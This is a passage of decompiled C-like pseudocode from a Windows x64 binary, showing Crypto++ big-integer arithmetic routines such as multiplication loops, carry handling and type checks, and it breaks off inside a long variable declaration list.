      v21 = (__int64 *)&v48;
    v22 = *v21;
    if ( *v21 )
    {
      if ( v7 - 1 >= v22 )
      {
        v23 = (signed __int64)&v10[8 * (v7 - 1)];
        v24 = v7 - v22;
        do
        {
          v25 = *(_QWORD *)(-8i64 * v22 + v23);
          v23 -= 8i64;
          *(_QWORD *)(v23 + 8) = v25;
          --v24;
        }
        while ( v24 );
      }
      if ( v22 )
        memset(v10, 0, 8 * v22);
    }
    v15 = *(_QWORD *)v11;
    v14 += 64;
    if ( *(_QWORD *)v11 )
      goto LABEL_31;
  }
  if ( a6 )
    memset(Dst, 0, 8 * a6);
  return 0i64;
}

//----- (000000014003E2C0) ----------------------------------------------------
bool __fastcall sub_14003E2C0(_QWORD *a1)
{
  return sub_140056DB0(a1) == 0;
}

//----- (000000014003E2E0) ----------------------------------------------------
char __fastcall sub_14003E2E0(__int64 a1, __int64 a2, int *a3)
{
  int *v3; // rdi
  __int64 v4; // rbp
  __int64 v5; // rcx
  int v7; // edi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  signed int v10; // esi
  _QWORD *v11; // rax
  signed __int64 v12; // rcx
  signed __int64 v13; // rax
  _QWORD *v14; // rcx
  __int64 (__fastcall **v15)(void *); // [rsp+20h] [rbp-48h]
  __int64 v16; // [rsp+30h] [rbp-38h]
  _QWORD *v17; // [rsp+38h] [rbp-30h]
  int v18; // [rsp+40h] [rbp-28h]
  __int64 v19; // [rsp+48h] [rbp-20h]

  v19 = -2i64;
  v3 = a3;
  v4 = a2;
  if ( (unsigned __int8)type_info::operator!=(a1, &CryptoPP::cls_097 `RTTI Type Descriptor') )
    return 0;
  v7 = *v3;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v5);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v15 = &off_1400A9910;
  v16 = 2i64;
  v8 = sub_14003A000(0x10ui64);
  v9 = v8;
  v17 = v8;
  if ( v7 < 0 )
  {
    v10 = 1;
    v7 = -v7;
  }
  else
  {
    v10 = 0;
  }
  v18 = v10;
  *v8 = v7;
  v11 = v8 + 1;
  v9[1] = 0i64;
  if ( (__int64 (__fastcall ***)(void *))v4 != &v15 )
  {
    v12 = 2i64;
    do
    {
      if ( *v11 )
        break;
      --v11;
      --v12;
    }
    while ( v12 );
    v13 = sub_14004B580((unsigned int)v12);
    sub_140049D90(v4 + 8, v13);
    v14 = *(_QWORD **)(v4 + 24);
    if ( v14 != v9 )
      memcpy_s(v14, 8i64 * *(_QWORD *)(v4 + 16), v9, 8i64 * *(_QWORD *)(v4 + 16));
    *(_DWORD *)(v4 + 32) = v10;
  }
  memset(v9, 0, 0x10ui64);
  free(v9);
  return 1;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003E400) ----------------------------------------------------
__int64 __fastcall sub_14003E400(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&CryptoPP::cls_097 `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&CryptoPP::cls_097 `RTTI Type Descriptor', v5);
    result = sub_14003C670(v4, v7 + 32);
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003E490) ----------------------------------------------------
__int64 __fastcall sub_14003E490(__int64 a1, void *a2, __int64 a3, _DWORD *a4)
{
  _DWORD *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(
                           &enum  CryptoPP::cls_097::cls_100 `RTTI Type Descriptor',
                           &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&enum  CryptoPP::cls_097::cls_100 `RTTI Type Descriptor', v5);
    result = *(unsigned int *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003E520) ----------------------------------------------------
int __fastcall sub_14003E520(unsigned __int64 *a1, __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5, unsigned __int64 a6)
{
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // rdi
  unsigned __int64 *v8; // rsi
  __int64 v9; // r14
  char *v10; // r15
  unsigned __int64 v11; // rax
  unsigned __int64 *v12; // r12
  unsigned __int64 v13; // r9
  unsigned __int64 v14; // rcx
  unsigned int v15; // edi
  __int64 v16; // r8
  unsigned __int128 v17; // ax
  rsize_t v18; // rdx
  __int64 v19; // rbp
  void *v20; // rcx
  rsize_t v21; // rdx
  __int64 v22; // r13
  __int64 v23; // rax
  unsigned __int64 v24; // r15
  unsigned __int64 v25; // r13
  char *v26; // r12
  unsigned __int64 v27; // rbp
  __int64 v28; // r13
  signed __int64 v29; // r12
  unsigned __int64 v30; // r13
  __int64 v31; // rbp
  signed __int64 v32; // rax
  unsigned __int64 v33; // rcx
  char *v34; // rdx
  signed __int64 v35; // rcx
  bool v36; // zf
  __int64 v38; // [rsp+30h] [rbp-48h]
  unsigned __int64 *v39; // [rsp+80h] [rbp+8h]
  signed __int64 v40; // [rsp+98h] [rbp+20h]
  unsigned __int64 *v41; // [rsp+A8h] [rbp+30h]

  v39 = a1;
  v6 = a6;
  v7 = a4;
  v8 = (unsigned __int64 *)a3;
  v9 = a2;
  v10 = (char *)a1;
  if ( a4 == a6 )
  {
    if ( a3 == a5 )
      LODWORD(v11) = sub_14004B210((__int64)a1, a2, a3, a4);
    else
      LODWORD(v11) = sub_14004ADC0((__int64)a1, a2, a3, a5, a4);
    return v11;
  }
  if ( a4 <= a6 )
  {
    v12 = (unsigned __int64 *)a5;
  }
  else
  {
    v8 = (unsigned __int64 *)a5;
    v7 = a6;
    v12 = (unsigned __int64 *)a3;
    v6 = a4;
  }
  v41 = v12;
  if ( v7 == 2 && !v8[1] )
  {
    v13 = *v8;
    v11 = *v8;
    if ( *v8 )
    {
      if ( --v11 )
      {
        v14 = 0i64;
        v15 = 0;
        if ( v6 )
        {
          v16 = 0i64;
          do
          {
            v17 = v12[v16] * (unsigned __int128)v13;
            v11 = v14 + v17;
            *(_QWORD *)&v10[8 * v16] = v11;
            v16 = ++v15;
            v14 = (v11 < v14) + *((_QWORD *)&v17 + 1);
          }
          while ( v15 < v6 );
        }
        *(_QWORD *)&v10[8 * v6] = v14;
        *(_QWORD *)&v10[8 * v6 + 8] = 0i64;
      }
      else
      {
        if ( a1 != v12 )
          LODWORD(v11) = memcpy_s(a1, 8 * v6, v12, 8 * v6);
        *(_QWORD *)&v10[8 * v6 + 8] = 0i64;
        *(_QWORD *)&v10[8 * v6] = 0i64;
      }
    }
    else if ( v6 != -2i64 )
    {
      LODWORD(v11) = 0;
      memset(a1, 0, 8 * (v6 + 2));
    }
    return v11;
  }
  if ( v6 / v7 & 1 )
  {
    v27 = 0i64;
    if ( v6 )
    {
      v28 = (__int64)a1;
      v29 = (char *)v12 - (char *)a1;
      do
      {
        sub_14004ADC0(v28, v9, (__int64)v8, v29 + v28, v7);
        v27 += 2 * v7;
        v28 += 16 * v7;
      }
      while ( v27 < v6 );
      v10 = (char *)v39;
      v12 = v41;
    }
    v30 = v7;
    if ( v7 >= v6 )
      goto LABEL_40;
    v31 = (__int64)&v12[v7];
    v32 = v9 + 8 * v7 - (_QWORD)v12;
    do
    {
      sub_14004ADC0(v32 + v31, v9, (__int64)v8, v31, v7);
      v32 = v9 + 8 * v7 - (_QWORD)v12;
      v30 += 2 * v7;
      v31 += 16 * v7;
    }
    while ( v30 < v6 );
  }
  else
  {
    sub_14004ADC0((__int64)a1, a2, (__int64)v8, (__int64)v12, v7);
    v18 = 8 * v7;
    v19 = (__int64)&v10[8 * v7];
    v20 = (void *)(16 * v7 + v9);
    v40 = 16 * v7;
    if ( v20 != (void *)v19 )
    {
      memcpy_s(v20, v18, &v10[8 * v7], 8 * v7);
      v18 = 8 * v7;
    }
    if ( 2 * v7 < v6 )
    {
      v21 = v18 - (_QWORD)v12;
      v22 = (__int64)&v12[2 * v7];
      v23 = v21 + v9;
      v24 = 2 * v7;
      v38 = v21 + v9;
      do
      {
        sub_14004ADC0(v23 + v22, v9, (__int64)v8, v22, v7);
        v23 = v38;
        v24 += 2 * v7;
        v22 += v40;
      }
      while ( v24 < v6 );
      v10 = (char *)v39;
    }
    v25 = v7;
    if ( v7 >= v6 )
      goto LABEL_40;
    v26 = (char *)((char *)v12 - v10);
    do
    {
      sub_14004ADC0(v19, v9, (__int64)v8, (__int64)&v26[v19], v7);
      v25 += 2 * v7;
      v19 += v40;
    }
    while ( v25 < v6 );
  }
  v10 = (char *)v39;
LABEL_40:
  LODWORD(v11) = sub_140062F10(v6 - v7, (__int64)&v10[8 * v7], (__int64)&v10[8 * v7], v9 + 16 * v7);
  if ( (_DWORD)v11 )
  {
    v33 = *(_QWORD *)&v10[8 * v6];
    v34 = &v10[8 * v6];
    LODWORD(v11) = v33 + 1;
    *(_QWORD *)v34 = v33 + 1;
    if ( v33 + 1 < v33 )
    {
      LODWORD(v11) = 1;
      if ( v7 > 1 )
      {
        v35 = 1i64;
        do
        {
          v36 = (*(_QWORD *)&v34[8 * v35])++ == -1i64;
          if ( !v36 )
            break;
          LODWORD(v11) = v11 + 1;
          v35 = (unsigned int)v11;
        }
        while ( (unsigned int)v11 < v7 );
      }
    }
  }
  return v11;
}

//----- (000000014003E8A0) ----------------------------------------------------
__int64 __fastcall sub_14003E8A0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  unsigned __int64 v3; // rbx
  char v5; // [rsp+30h] [rbp-58h]
  char v6; // [rsp+61h] [rbp-27h]
  unsigned __int64 v7; // [rsp+68h] [rbp-20h]

  v2 = a1;
  sub_14005F770((__int64)&v5, a2, 2);
  if ( !v6 || (v3 = v7, sub_140038B10((__int64)&v5) < v3) )
    sub_14003E950();
  sub_140045CD0(v2, (__int64)&v5, v7, 1);
  sub_140060990((__int64)&v5);
  return sub_14005F840(&v5);
}
// 14005F840: using guessed type __int64 __fastcall sub_14005F840(_QWORD);

//----- (000000014003E950) ----------------------------------------------------
void __noreturn sub_14003E950()
{
  char v0; // [rsp+20h] [rbp-58h]

  sub_14003BD50(&v0);
  CxxThrowException(&v0, &_TI4_AVcls_051_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D41B8: using guessed type int _TI4_AVcls_051_CryptoPP__;

//----- (000000014003E980) ----------------------------------------------------
unsigned __int64 __fastcall sub_14003E980(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  unsigned __int64 *v3; // rbx
  unsigned __int64 *v4; // rdi
  _QWORD *v5; // rsi
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // r10
  unsigned __int64 v9; // r8
  unsigned __int128 v10; // ax
  unsigned __int64 v11; // r10
  _BOOL8 v12; // r9
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // r9
  _BOOL8 v16; // r10
  unsigned __int128 v17; // ax
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // r9
  _BOOL8 v20; // r10
  unsigned __int128 v21; // ax
  unsigned __int64 v22; // r9
  _BOOL8 v23; // r10
  unsigned __int128 v24; // ax
  unsigned __int64 v25; // rcx
  unsigned __int64 v26; // r10
  _BOOL8 v27; // r9
  unsigned __int128 v28; // ax
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // r10
  _BOOL8 v31; // r9
  unsigned __int128 v32; // ax
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r10
  _BOOL8 v35; // r9
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r10
  _BOOL8 v38; // r9
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // rcx
  unsigned __int64 v41; // r9
  _BOOL8 v42; // r10
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // r8
  unsigned __int64 v45; // r9
  _BOOL8 v46; // r10
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r9
  _BOOL8 v50; // r10
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  _BOOL8 v54; // r10
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r9
  __int64 v57; // r10
  unsigned __int128 v58; // ax
  unsigned __int64 v59; // rcx
  unsigned __int64 v60; // r10
  _BOOL8 v61; // r9
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r10
  _BOOL8 v65; // r9
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r10
  _BOOL8 v69; // r9
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // r10
  _BOOL8 v73; // r9
  unsigned __int128 v74; // ax
  unsigned __int64 v75; // rcx
  unsigned __int64 v76; // r10
  __int64 v77; // r9
  unsigned __int128 v78; // ax
  unsigned __int64 v79; // r10
  __int64 v80; // r9
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // rcx
  unsigned __int64 v83; // r9
  _BOOL8 v84; // r10
  unsigned __int128 v85; // ax
  unsigned __int64 v86; // r8
  unsigned __int64 v87; // r9
  _BOOL8 v88; // r10
  unsigned __int128 v89; // ax
  unsigned __int64 v90; // rcx
  unsigned __int64 v91; // r9
  _BOOL8 v92; // r10
  unsigned __int128 v93; // ax
  unsigned __int64 v94; // r8
  unsigned __int64 v95; // r9
  _BOOL8 v96; // r10
  unsigned __int128 v97; // ax
  unsigned __int64 v98; // rcx
  unsigned __int64 v99; // r9
  __int64 v100; // r10
  unsigned __int128 v101; // ax
  unsigned __int64 v102; // r8
  unsigned __int64 v103; // r9
  __int64 v104; // r10
  unsigned __int128 v105; // ax
  unsigned __int64 v106; // r9
  __int64 v107; // r10
  unsigned __int128 v108; // ax
  unsigned __int64 v109; // rcx
  unsigned __int64 v110; // r10
  _BOOL8 v111; // r9
  unsigned __int128 v112; // ax
  unsigned __int64 v113; // r8
  unsigned __int64 v114; // r10
  _BOOL8 v115; // r9
  unsigned __int128 v116; // ax
  unsigned __int64 v117; // rcx
  unsigned __int64 v118; // r10
  _BOOL8 v119; // r9
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // r8
  unsigned __int64 v122; // r10
  _BOOL8 v123; // r9
  unsigned __int128 v124; // ax
  unsigned __int64 v125; // rcx
  unsigned __int64 v126; // r10
  __int64 v127; // r9
  unsigned __int128 v128; // ax
  unsigned __int64 v129; // r8
  unsigned __int64 v130; // r10
  __int64 v131; // r9
  unsigned __int128 v132; // ax
  unsigned __int64 v133; // rcx
  unsigned __int64 v134; // r10
  __int64 v135; // r9
  unsigned __int128 v136; // ax
  unsigned __int64 v137; // r10
  __int64 v138; // r9
  unsigned __int128 v139; // ax
  unsigned __int64 v140; // rcx
  unsigned __int64 v141; // r9
  _BOOL8 v142; // r10
  unsigned __int128 v143; // ax
  unsigned __int64 v144; // r8
  unsigned __int64 v145; // r9
  _BOOL8 v146; // r10
  unsigned __int128 v147; // ax
  unsigned __int64 v148; // rcx
  unsigned __int64 v149; // r9
  _BOOL8 v150; // r10
  unsigned __int128 v151; // ax
  unsigned __int64 v152; // r8
  unsigned __int64 v153; // r9
  _BOOL8 v154; // r10
  unsigned __int128 v155; // ax
  unsigned __int64 v156; // rcx
  unsigned __int64 v157; // r9
  __int64 v158; // r10
  unsigned __int128 v159; // ax
  unsigned __int64 v160; // r8
  unsigned __int64 v161; // r9
  __int64 v162; // r10
  unsigned __int128 v163; // ax
  unsigned __int64 v164; // rcx
  unsigned __int64 v165; // r9
  __int64 v166; // r10
  unsigned __int128 v167; // ax
  unsigned __int64 v168; // r8
  unsigned __int64 v169; // r9
  __int64 v170; // r10
  unsigned __int128 v171; // ax
  unsigned __int64 v172; // r9
  __int64 v173; // r10
  unsigned __int128 v174; // ax
  unsigned __int64 v175; // rcx
  unsigned __int64 v176; // r10
  _BOOL8 v177; // r9
  unsigned __int128 v178; // ax
  unsigned __int64 v179; // r8
  unsigned __int64 v180; // r10
  _BOOL8 v181; // r9
  unsigned __int128 v182; // ax
  unsigned __int64 v183; // rcx
  unsigned __int64 v184; // r10
  _BOOL8 v185; // r9
  unsigned __int128 v186; // ax
  unsigned __int64 v187; // r8
  unsigned __int64 v188; // r10
  _BOOL8 v189; // r9
  unsigned __int128 v190; // ax
  unsigned __int64 v191; // rcx
  unsigned __int64 v192; // r10
  __int64 v193; // r9
  unsigned __int128 v194; // ax
  unsigned __int64 v195; // r8
  unsigned __int64 v196; // r10
  __int64 v197; // r9
  unsigned __int128 v198; // ax
  unsigned __int64 v199; // rcx
  unsigned __int64 v200; // r10
  __int64 v201; // r9
  unsigned __int128 v202; // ax
  unsigned __int64 v203; // r8
  unsigned __int64 v204; // r10
  __int64 v205; // r9
  unsigned __int128 v206; // ax
  unsigned __int64 v207; // rcx
  unsigned __int64 v208; // r10
  __int64 v209; // r9
  unsigned __int128 v210; // ax
  unsigned __int64 v211; // r10
  __int64 v212; // r9
  unsigned __int128 v213; // ax
  unsigned __int64 v214; // rcx
  unsigned __int64 v215; // r9
  _BOOL8 v216; // r10
  unsigned __int128 v217; // ax
  unsigned __int64 v218; // r8
  unsigned __int64 v219; // r9
  _BOOL8 v220; // r10
  unsigned __int128 v221; // ax
  unsigned __int64 v222; // rcx
  unsigned __int64 v223; // r9
  _BOOL8 v224; // r10
  unsigned __int128 v225; // ax
  unsigned __int64 v226; // r8
  unsigned __int64 v227; // r9
  _BOOL8 v228; // r10
  unsigned __int128 v229; // ax
  unsigned __int64 v230; // rcx
  unsigned __int64 v231; // r9
  __int64 v232; // r10
  unsigned __int128 v233; // ax
  unsigned __int64 v234; // r8
  unsigned __int64 v235; // r9
  __int64 v236; // r10
  unsigned __int128 v237; // ax
  unsigned __int64 v238; // rcx
  unsigned __int64 v239; // r9
  __int64 v240; // r10
  unsigned __int128 v241; // ax
  unsigned __int64 v242; // r8
  unsigned __int64 v243; // r9
  __int64 v244; // r10
  unsigned __int128 v245; // ax
  unsigned __int64 v246; // rcx
  unsigned __int64 v247; // r9
  __int64 v248; // r10
  unsigned __int128 v249; // ax
  unsigned __int64 v250; // r8
  unsigned __int64 v251; // r9
  __int64 v252; // r10
  unsigned __int128 v253; // ax
  unsigned __int64 v254; // r9
  __int64 v255; // r10
  unsigned __int128 v256; // ax
  unsigned __int64 v257; // rcx
  unsigned __int64 v258; // r10
  _BOOL8 v259; // r9
  unsigned __int128 v260; // ax
  unsigned __int64 v261; // r8
  unsigned __int64 v262; // r10
  _BOOL8 v263; // r9
  unsigned __int128 v264; // ax
  unsigned __int64 v265; // rcx
  unsigned __int64 v266; // r10
  _BOOL8 v267; // r9
  unsigned __int128 v268; // ax
  unsigned __int64 v269; // r8
  unsigned __int64 v270; // r10
  _BOOL8 v271; // r9
  unsigned __int128 v272; // ax
  unsigned __int64 v273; // rcx
  unsigned __int64 v274; // r10
  __int64 v275; // r9
  unsigned __int128 v276; // ax
  unsigned __int64 v277; // r8
  unsigned __int64 v278; // r10
  __int64 v279; // r9
  unsigned __int128 v280; // ax
  unsigned __int64 v281; // rcx
  unsigned __int64 v282; // r10
  __int64 v283; // r9
  unsigned __int128 v284; // ax
  unsigned __int64 v285; // r8
  unsigned __int64 v286; // r10
  __int64 v287; // r9
  unsigned __int128 v288; // ax
  unsigned __int64 v289; // rcx
  unsigned __int64 v290; // r10
  __int64 v291; // r9
  unsigned __int128 v292; // ax
  unsigned __int64 v293; // r8
  unsigned __int64 v294; // r10
  __int64 v295; // r9
  unsigned __int128 v296; // ax
  unsigned __int64 v297; // rcx
  unsigned __int64 v298; // r10
  __int64 v299; // r9
  unsigned __int128 v300; // ax
  unsigned __int64 v301; // r10
  __int64 v302; // r9
  unsigned __int128 v303; // ax
  unsigned __int64 v304; // rcx
  unsigned __int64 v305; // r9
  _BOOL8 v306; // r10
  unsigned __int128 v307; // ax
  unsigned __int64 v308; // r8
  unsigned __int64 v309; // r9
  _BOOL8 v310; // r10
  unsigned __int128 v311; // ax
  unsigned __int64 v312; // rcx
  unsigned __int64 v313; // r9
  _BOOL8 v314; // r10
  unsigned __int128 v315; // ax
  unsigned __int64 v316; // r8
  unsigned __int64 v317; // r9
  _BOOL8 v318; // r10
  unsigned __int128 v319; // ax
  unsigned __int64 v320; // rcx
  unsigned __int64 v321; // r9
  __int64 v322; // r10
  unsigned __int128 v323; // ax
  unsigned __int64 v324; // r8
  unsigned __int64 v325; // r9
  __int64 v326; // r10
  unsigned __int128 v327; // ax
  unsigned __int64 v328; // rcx
  unsigned __int64 v329; // r9
  __int64 v330; // r10
  unsigned __int128 v331; // ax
  unsigned __int64 v332; // r8
  unsigned __int64 v333; // r9
  __int64 v334; // r10
  unsigned __int128 v335; // ax
  unsigned __int64 v336; // rcx
  unsigned __int64 v337; // r9
  __int64 v338; // r10
  unsigned __int128 v339; // ax
  unsigned __int64 v340; // r8
  unsigned __int64 v341; // r9
  __int64 v342; // r10
  unsigned __int128 v343; // ax
  unsigned __int64 v344; // rcx
  unsigned __int64 v345; // r9
  __int64 v346; // r10
  unsigned __int128 v347; // ax
  unsigned __int64 v348; // r8
  unsigned __int64 v349; // r9
  __int64 v350; // r10
  unsigned __int128 v351; // ax
  unsigned __int64 v352; // r9
  __int64 v353; // r10
  unsigned __int128 v354; // ax
  unsigned __int64 v355; // rcx
  unsigned __int64 v356; // r10
  _BOOL8 v357; // r9
  unsigned __int128 v358; // ax
  unsigned __int64 v359; // r8
  unsigned __int64 v360; // r10
  _BOOL8 v361; // r9
  unsigned __int128 v362; // ax
  unsigned __int64 v363; // rcx
  unsigned __int64 v364; // r10
  _BOOL8 v365; // r9
  unsigned __int128 v366; // ax
  unsigned __int64 v367; // r8
  unsigned __int64 v368; // r10
  _BOOL8 v369; // r9
  unsigned __int128 v370; // ax
  unsigned __int64 v371; // rcx
  unsigned __int64 v372; // r10
  __int64 v373; // r9
  unsigned __int128 v374; // ax
  unsigned __int64 v375; // r8
  unsigned __int64 v376; // r10
  __int64 v377; // r9
  unsigned __int128 v378; // ax
  unsigned __int64 v379; // rcx
  unsigned __int64 v380; // r10
  __int64 v381; // r9
  unsigned __int128 v382; // ax
  unsigned __int64 v383; // r8
  unsigned __int64 v384; // r10
  __int64 v385; // r9
  unsigned __int128 v386; // ax
  unsigned __int64 v387; // rcx
  unsigned __int64 v388; // r10
  __int64 v389; // r9
  unsigned __int128 v390; // ax
  unsigned __int64 v391; // r8
  unsigned __int64 v392; // r10
  __int64 v393; // r9
  unsigned __int128 v394; // ax
  unsigned __int64 v395; // rcx
  unsigned __int64 v396; // r10
  __int64 v397; // r9
  unsigned __int128 v398; // ax
  unsigned __int64 v399; // r8
  unsigned __int64 v400; // r10
  __int64 v401; // r9
  unsigned __int128 v402; // ax
  unsigned __int64 v403; // rcx
  unsigned __int64 v404; // r10
  __int64 v405; // r9
  unsigned __int128 v406; // ax
  unsigned __int64 v407; // r10
  __int64 v408; // r9
  unsigned __int128 v409; // ax
  unsigned __int64 v410; // rcx
  unsigned __int64 v411; // r9
  _BOOL8 v412; // r11
  unsigned __int128 v413; // ax
  unsigned __int64 v414; // r8
  unsigned __int64 v415; // r9
  _BOOL8 v416; // r11
  unsigned __int128 v417; // ax
  unsigned __int64 v418; // rcx
  unsigned __int64 v419; // r9
  _BOOL8 v420; // r11
  unsigned __int128 v421; // ax
  unsigned __int64 v422; // r8
  unsigned __int64 v423; // r9
  _BOOL8 v424; // r11
  unsigned __int128 v425; // ax
  unsigned __int64 v426; // rcx
  unsigned __int64 v427; // r9
  __int64 v428; // r11
  unsigned __int128 v429; // ax
  unsigned __int64 v430; // r8
  unsigned __int64 v431; // r9
  __int64 v432; // r11
  unsigned __int128 v433; // ax
  unsigned __int64 v434; // rcx
  unsigned __int64 v435; // r9
  __int64 v436; // r11
  unsigned __int128 v437; // ax
  unsigned __int64 v438; // r8
  unsigned __int64 v439; // r9
  __int64 v440; // r11
  unsigned __int128 v441; // ax
  unsigned __int64 v442; // rcx
  unsigned __int64 v443; // r9
  __int64 v444; // r11
  unsigned __int128 v445; // ax
  unsigned __int64 v446; // r8
  unsigned __int64 v447; // r9
  __int64 v448; // r11
  unsigned __int128 v449; // ax
  unsigned __int64 v450; // rcx
  unsigned __int64 v451; // r9
  __int64 v452; // r11
  unsigned __int128 v453; // ax
  unsigned __int64 v454; // r8
  unsigned __int64 v455; // r9
  __int64 v456; // r11
  unsigned __int128 v457; // ax
  unsigned __int64 v458; // rcx
  unsigned __int64 v459; // r9
  __int64 v460; // r11
  unsigned __int128 v461; // ax
  unsigned __int64 v462; // r8
  unsigned __int64 v463; // r9
  __int64 v464; // r11
  unsigned __int128 v465; // ax
  unsigned __int64 v466; // r9
  __int64 v467; // r11
  unsigned __int128 v468; // ax
  unsigned __int64 v469; // rcx
  unsigned __int64 v470; // r11
  _BOOL8 v471; // r10
  unsigned __int128 v472; // ax
  unsigned __int64 v473; // r8
  unsigned __int64 v474; // r11
  _BOOL8 v475; // r10
  unsigned __int128 v476; // ax
  unsigned __int64 v477; // rcx
  unsigned __int64 v478; // r11
  _BOOL8 v479; // r10
  unsigned __int128 v480; // ax
  unsigned __int64 v481; // r8
  unsigned __int64 v482; // r11
  _BOOL8 v483; // r10
  unsigned __int128 v484; // ax
  unsigned __int64 v485; // rcx
  unsigned __int64 v486; // r11
  __int64 v487; // r10
  unsigned __int128 v488; // ax
  unsigned __int64 v489; // r8
  unsigned __int64 v490; // r11
  __int64 v491; // r10
  unsigned __int128 v492; // ax
  unsigned __int64 v493; // rcx
  unsigned __int64 v494; // r11
  __int64 v495; // r10
  unsigned __int128 v496; // ax
  unsigned __int64 v497; // r8
  unsigned __int64 v498; // r11
  __int64 v499; // r10
  unsigned __int128 v500; // ax
  unsigned __int64 v501; // rcx
  unsigned __int64 v502; // r11
  __int64 v503; // r10
  unsigned __int128 v504; // ax
  unsigned __int64 v505; // r8
  unsigned __int64 v506; // r11
  __int64 v507; // r10
  unsigned __int128 v508; // ax
  unsigned __int64 v509; // rcx
  unsigned __int64 v510; // r11
  __int64 v511; // r10
  unsigned __int128 v512; // ax
  unsigned __int64 v513; // r8
  unsigned __int64 v514; // r11
  __int64 v515; // r10
  unsigned __int128 v516; // ax
  unsigned __int64 v517; // rcx
  unsigned __int64 v518; // r11
  __int64 v519; // r10
  unsigned __int128 v520; // ax
  unsigned __int64 v521; // r8
  unsigned __int64 v522; // r11
  __int64 v523; // r10
  unsigned __int128 v524; // ax
  unsigned __int64 v525; // rcx
  unsigned __int64 v526; // r11
  __int64 v527; // r10
  unsigned __int128 v528; // ax
  unsigned __int64 v529; // r11
  __int64 v530; // r10
  unsigned __int128 v531; // ax
  unsigned __int64 v532; // rcx
  unsigned __int64 v533; // r10
  _BOOL8 v534; // r9
  unsigned __int128 v535; // ax
  unsigned __int64 v536; // r8
  unsigned __int64 v537; // r10
  _BOOL8 v538; // r9
  unsigned __int128 v539; // ax
  unsigned __int64 v540; // rcx
  unsigned __int64 v541; // r10
  _BOOL8 v542; // r9
  unsigned __int128 v543; // ax
  unsigned __int64 v544; // r8
  unsigned __int64 v545; // r10
  _BOOL8 v546; // r9
  unsigned __int128 v547; // ax
  unsigned __int64 v548; // rcx
  unsigned __int64 v549; // r10
  __int64 v550; // r9
  unsigned __int128 v551; // ax
  unsigned __int64 v552; // r8
  unsigned __int64 v553; // r10
  __int64 v554; // r9
  unsigned __int128 v555; // ax
  unsigned __int64 v556; // rcx
  unsigned __int64 v557; // r10
  __int64 v558; // r9
  unsigned __int128 v559; // ax
  unsigned __int64 v560; // r8
  unsigned __int64 v561; // r10
  __int64 v562; // r9
  unsigned __int128 v563; // ax
  unsigned __int64 v564; // rcx
  unsigned __int64 v565; // r10
  __int64 v566; // r9
  unsigned __int128 v567; // ax
  unsigned __int64 v568; // r8
  unsigned __int64 v569; // r10
  __int64 v570; // r9
  unsigned __int128 v571; // ax
  unsigned __int64 v572; // rcx
  unsigned __int64 v573; // r10
  __int64 v574; // r9
  unsigned __int128 v575; // ax
  unsigned __int64 v576; // r8
  unsigned __int64 v577; // r10
  __int64 v578; // r9
  unsigned __int128 v579; // ax
  unsigned __int64 v580; // rcx
  unsigned __int64 v581; // r10
  __int64 v582; // r9
  unsigned __int128 v583; // ax
  unsigned __int64 v584; // r8
  unsigned __int64 v585; // r10
  __int64 v586; // r9
  unsigned __int128 v587; // ax
  unsigned __int64 v588; // r10
  __int64 v589; // r9
  unsigned __int128 v590; // ax
